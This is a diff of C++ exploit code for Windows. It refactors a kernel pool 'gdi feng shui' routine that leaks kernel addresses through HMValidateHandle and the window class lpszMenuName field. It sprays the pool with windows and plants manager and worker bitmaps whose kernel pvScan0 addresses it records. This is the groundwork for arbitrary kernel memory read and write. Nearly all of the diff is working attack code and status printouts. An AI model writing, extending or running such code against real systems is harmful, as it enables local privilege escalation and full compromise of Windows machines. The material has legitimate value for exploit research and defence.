@@ -25,9 +25,8 @@
 
 */
 
-
-
 #pragma once
+#include "stdafx.h"
 #include <Windows.h>
 #include <stdio.h>
 #include <cstdint>
@@ -43,8 +42,12 @@ typedef void*(NTAPI *lHMValidateHandle)(
 
 int g = 1;
 
-HBITMAP managerBitmap;
-HBITMAP workerBitmap;
+typedef struct _hBmp {
+	HBITMAP hBmp;
+	DWORD64 kAddr;
+	PUCHAR pvScan0;
+} HBMP, *PHBMP;
+
 
 LRESULT
 CALLBACK MainWProc(
@@ -57,7 +60,7 @@ CALLBACK MainWProc(
 
 lHMValidateHandle pHmValidateHandle = NULL;
 
-//https://github.com/sam-b/windows_kernel_address_leaks/blob/master/HMValidateHandle/HMValidateHandle/HMValidateHandle.cpp
+// https://github.com/sam-b/windows_kernel_address_leaks/blob/master/HMValidateHandle/HMValidateHandle/HMValidateHandle.cpp
 BOOL
 GetHMValidateHandle(
 )
@@ -212,44 +215,35 @@ LeaklpszMenuName(
 	DWORD64 lpszMenuNameOffset = 0x90;
 	BOOL bRet = GetHMValidateHandle();
 	uintptr_t lpUserDesktopHeapWindow = (uintptr_t)pHmValidateHandle(hWnd, 1);
-	//long lpUserDesktopHeapWindow = (long)Convert::ToInt64(uWND);
-	//Int64 ^ ulClientDelta = Marshal::ReadInt64((IntPtr)&uWND + 0x20) - lpUserDesktopHeapWindow;
-	//printf("%p", ulClientDelta);
-	uintptr_t ulClientDelta = *reinterpret_cast<DWORD64 *>(lpUserDesktopHeapWindow + 0x20) - lpUserDesktopHeapWindow;
-	//printf("%p\n", ulClientDelta);
-	//(DWORD64)(lpUserDesktopHeapWindow);
-	uintptr_t KerneltagCLS = *reinterpret_cast<DWORD64 *>(lpUserDesktopHeapWindow+ pCLSOffset);
-	//printf("%p\n", KerneltagCLS);
-	//printf("%p\n", KerneltagCLS - ulClientDelta + lpszMenuNameOffset);
-	//DWORD64 lpUserDesktopHeapWindow = *reinterpret_cast<DWORD64 *>(uWND);
+	uintptr_t ulClientDelta = *reinterpret_cast<DWORD64 *>((DWORD64)(lpUserDesktopHeapWindow) + 0x20) - (DWORD64)(lpUserDesktopHeapWindow);
+	uintptr_t KerneltagCLS = *reinterpret_cast<DWORD64 *>((DWORD64)lpUserDesktopHeapWindow+ pCLSOffset);
 	DWORD64 lpszMenuName = *reinterpret_cast<DWORD64 *>(KerneltagCLS - ulClientDelta + lpszMenuNameOffset);
-	//printf("%p\n", lpszMenuName);
-	//int z; scanf("%d", &z);
 	return lpszMenuName;
 }
 
-// i have found that it is usefull
-// to try and un-randomize the pool
-// entropy b4 leaking lpszMenuName.
 VOID
 SprayPool(
 )
 {
-	for (int i = 0; i <= 200; i++) {
+	for (int i = 0; i <= 1000; i++) {
 		HWND TestWindowHandle = CreateWindowObject();
 		auto Curr = LeaklpszMenuName(TestWindowHandle);
+		//if (i % 25) {
+			//printf("%d\n",i);
 		DestroyWnd(TestWindowHandle);
+		//}
 	}
 }
 
-DWORD64 
+BOOL
 Leak(
-	int y
+	_In_ int y,
+	_In_ HBMP &hbmp
 	)
 {
-	if (y == 0) {
+	//if (y == 0) {
 		SprayPool();
-	}
+	//}
 	
 	DWORD64 Curr, Prev = NULL;
 
@@ -259,29 +253,22 @@ Leak(
 		if (1<=i) {
 			if (Curr == Prev) {
 				DestroyWnd(TestWindowHandle);
-				WCHAR* Buff = new WCHAR[0x50 * 2 * 4];
-				RtlSecureZeroMemory(Buff, 0x50 * 2 * 4);
-				RtlFillMemory(Buff, 0x50 * 2 * 4, '\x41');
-				if (y == 0) {
-					managerBitmap = CreateBitmap(0x701, 2, 1, 8, Buff);
-				}
-				else {
-
-					workerBitmap = CreateBitmap(0x701, 2, 1, 8, Buff);
-				}
+				//return TRUE;
 				break;
 			}
 		}
 		DestroyWnd(TestWindowHandle);
 		Prev = Curr;
 	}
-	//printf("%p, %p\n", Prev , Curr);
-	auto pvscan0 = Prev + 0x50;
 
-	//printf("%p\n", pvscan0);
-	//int g;
-	//scanf("%d", &g);
-	return pvscan0;
+	WCHAR* Buff = new WCHAR[0x50 * 2 * 4];
+	RtlSecureZeroMemory(Buff, 0x50 * 2 * 4);
+	RtlFillMemory(Buff, 0x50 * 2 * 4, '\x41');
+	hbmp.hBmp = CreateBitmap(0x701, 2, 1, 8, Buff);
+	hbmp.kAddr = Curr;
+	hbmp.pvScan0 = (PUCHAR)(Curr + 0x50);
+
+	return TRUE;
 }
 
 int
@@ -289,24 +276,26 @@ main(
 )
 {
 
-	
-
-	//auto bRet = GetHMValidateHandle();
-	//if (!bRet) {
-	//	exit( GetLastError() );
-	//}
-
 	printf("\n[!] gdi feng shui ..\n");
 	printf("[>] Spraying the pool\n");
 	printf("[>] leaking ulClientDelta...\n");
-	auto a = Leak(0);
-	auto b = Leak(1);
+	HBMP managerBitmap;
+	HBMP workerBitmap;
+	if (!Leak(0, managerBitmap)) {
+		exit(GetLastError());
+	}
+	if (!Leak(1, workerBitmap)) {
+		exit(GetLastError());
+	}
 	
 	printf("\n[+] pHmValidateHandle: %p \n", pHmValidateHandle);
-	printf("[+] hMgr: %p\n", &managerBitmap);
-	printf("[+] hWorker: %p\n", &workerBitmap);
-	printf("[+] Mgr pvScan0 offset: %p\n", a);
-	printf("[+] Wrk pvScan0 offset: %p\n", b);
+	printf("[+] hMgr: %p\n", &managerBitmap.hBmp);
+	printf("[+] hWorker: %p\n", &workerBitmap.hBmp);
+	printf("[+] Mgr pvScan0 offset: %p\n", managerBitmap.kAddr & -0xfff);
+	printf("[+] Wrk pvScan0 offset: %p\n", workerBitmap.kAddr & -0xfff);
+
+	int s;
+	scanf("%d", &s);
 
 	int y;
 	scanf("%d", &y);
